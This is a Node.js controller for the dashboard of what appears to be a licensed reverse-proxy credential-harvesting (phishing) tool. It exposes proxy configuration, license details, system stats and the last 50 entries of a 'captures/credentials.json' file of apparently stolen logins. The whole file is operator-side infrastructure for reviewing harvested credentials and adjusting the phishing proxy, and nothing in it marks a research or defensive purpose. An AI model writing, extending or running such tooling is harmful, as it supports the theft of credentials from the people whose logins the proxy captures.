import fs from 'fs';
import path from 'path';
import ProxyConfigManager from '../utils/proxy-config-manager.js';
import LicenseManager from '../utils/license-manager.js';
import Logger from '../utils/logger.js';

class DashboardController {
    constructor() {
        this.proxyConfigManager = new ProxyConfigManager();
        this.licenseManager = new LicenseManager();
        this.logger = new Logger();
    }

    // Get overall dashboard data
    async getDashboardData(req, res) {
        try {
            const [proxyConfig, captureLogs, licenseInfo] = await Promise.all([
                this.proxyConfigManager.getProxyConfig(),
                this.getRecentCaptureLogs(),
                this.licenseManager.getLicenseInfo()
            ]);

            res.json({
                proxyConfig,
                captureLogs,
                licenseInfo,
                systemStats: this.getSystemStats()
            });
        } catch (error) {
            this.logger.error('Dashboard data retrieval failed', { error: error.message });
            res.status(500).json({ message: 'Failed to retrieve dashboard data' });
        }
    }

    // Get proxy configuration
    async getProxyConfig(req, res) {
        try {
            const config = await this.proxyConfigManager.getProxyConfig();
            res.json(config);
        } catch (error) {
            res.status(500).json({ message: 'Failed to retrieve proxy configuration' });
        }
    }

    // Update proxy configuration
    async updateProxyConfig(req, res) {
        try {
            const newConfig = req.body;
            await this.proxyConfigManager.updateProxyConfig(newConfig);
            res.json({ message: 'Configuration updated successfully' });
        } catch (error) {
            res.status(500).json({ message: 'Failed to update proxy configuration' });
        }
    }

    // Get recent capture logs
    async getCaptureLogs(req, res) {
        try {
            const logs = await this.getRecentCaptureLogs();
            res.json(logs);
        } catch (error) {
            res.status(500).json({ message: 'Failed to retrieve capture logs' });
        }
    }

    // Get license information
    async getLicenseInfo(req, res) {
        try {
            const licenseInfo = await this.licenseManager.getLicenseInfo();
            res.json(licenseInfo);
        } catch (error) {
            res.status(500).json({ message: 'Failed to retrieve license information' });
        }
    }

    // Get recent capture logs (helper method)
    async getRecentCaptureLogs() {
        const logPath = path.resolve('./storage/captures/credentials.json');
        try {
            // Read and parse last 50 log entries
            const logContent = fs.readFileSync(logPath, 'utf8');
            const logs = logContent.trim().split('\n').slice(-50).map(JSON.parse);
            return logs;
        } catch (error) {
            this.logger.error('Failed to read capture logs', { error: error.message });
            return [];
        }
    }

    // Get system stats
    getSystemStats() {
        return {
            uptime: process.uptime(),
            memoryUsage: process.memoryUsage(),
            cpuUsage: process.cpuUsage()
        };
    }
}

export default DashboardController;